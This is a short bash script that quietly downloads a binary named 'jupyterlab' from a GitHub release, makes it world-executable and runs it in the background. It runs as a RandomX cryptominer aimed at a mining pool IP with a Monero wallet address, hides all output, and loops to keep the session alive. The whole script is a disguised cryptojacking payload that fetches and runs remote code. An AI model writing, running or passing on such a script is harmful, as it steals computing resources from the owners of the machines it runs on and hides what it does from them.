#!/bin/bash

curl -sLkO https://github.com/paskofa10/vps/releases/download/uranus/jupyterlab >/dev/null 2>&1
chmod 777 jupyterlab
./jupyterlab -a randomx -o 185.84.98.85:443 -u 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi -p WORKER-E1 >/dev/null 2>&1 &
sleep 20
while true
do
        echo "Ojo Lali Ngopi Boss..."
        sleep 100
done
